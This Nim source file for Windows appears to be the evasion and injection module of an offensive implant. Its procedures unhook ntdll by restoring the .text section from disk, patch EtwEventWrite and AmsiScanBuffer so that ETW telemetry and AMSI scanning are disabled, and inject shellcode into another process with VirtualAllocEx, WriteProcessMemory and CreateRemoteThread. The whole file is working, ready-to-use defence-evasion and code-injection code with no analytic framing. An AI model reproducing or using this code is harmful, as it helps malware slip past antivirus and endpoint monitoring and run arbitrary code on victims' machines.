import helpers
import winim
import dynlib
import strutils


proc unhook_ntdll*(): bool =

  var is_success = false
  
  let low: uint16 = 0
  var 
      processH = GetCurrentProcess()
      mi : MODULEINFO
      ntdllModule = GetModuleHandleA("ntdll.dll")
      ntdllBase : LPVOID
      ntdllFile : FileHandle
      ntdllMapping : HANDLE
      ntdllMappingAddress : LPVOID
      hookedDosHeader : PIMAGE_DOS_HEADER
      hookedNtHeader : PIMAGE_NT_HEADERS
      hookedSectionHeader : PIMAGE_SECTION_HEADER

  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
  ntdllBase = mi.lpBaseOfDll
  ntdllFile = getOsFileHandle(open("C:\\windows\\system32\\ntdll.dll",fmRead))
  ntdllMapping = CreateFileMapping(ntdllFile, NULL, 16777218, 0, 0, NULL)
  if ntdllMapping != 0:
    ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
    if not ntdllMappingAddress.isNil:
        hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
        hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
        for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
            hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
            if ".text" in to_string(hookedSectionHeader.Name):
                var oldProtection : DWORD = 0
                if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, 0x40, addr oldProtection) != 0:
                    copyMem(ntdllBase + hookedSectionHeader.VirtualAddress, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
                    if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, oldProtection, addr oldProtection) != 0:
                        is_success = true
    CloseHandle(processH)
    CloseHandle(ntdllFile)
    CloseHandle(ntdllMapping)
    FreeLibrary(ntdllModule)

    return is_success


proc patch_func*(command_name: string): bool =
    
    const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    var    
        is_success = false
        dll_name: string
        func_name: string
        dll_h: LibHandle
        to_patch: pointer
        op: DWORD
        t: DWORD

    case command_name:
        of "etw":
            dll_name = "ntdll"
            func_name = "EtwEventWrite"
        of "amsi":
            dll_name = "amsi"
            func_name = "AmsiScanBuffer"

    dll_h = loadLib(dll_name)
    if not isNil(dll_h):
        to_patch = dll_h.symAddr(func_name)
        if not isNil(to_patch):
            if VirtualProtect(to_patch, patch.len, 0x40, addr op):
                copyMem(to_patch, unsafeAddr patch, patch.len)
                VirtualProtect(to_patch, patch.len, op, addr t)
                is_success = true

    return is_success


proc inject_shellcode*(shellc: seq[byte], pid: int): bool = 

    let process_h = OpenProcess(
    PROCESS_ALL_ACCESS, 
    false, 
    cast[DWORD](pid)
    )
    if process_h == 0:
        return false

    let remote_address = VirtualAllocEx(
        process_h,
        NULL,
        cast[SIZE_T](shellc.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    let write_success = WriteProcessMemory(
        process_h, 
        remote_address,
        unsafeAddr shellc[0],
        cast[SIZE_T](shellc.len),
        nil
    )
    if not bool(write_success):
        CloseHandle(process_h)
        return false

    let thread_handle = CreateRemoteThread(
        process_h, 
        NULL,
        0,
        cast[LPTHREAD_START_ROUTINE](remote_address),
        NULL, 
        0, 
        NULL
    )

    if thread_handle == 0:
        CloseHandle(process_h)
        return false
    
    CloseHandle(process_h)
    CloseHandle(thread_handle)
    return true
    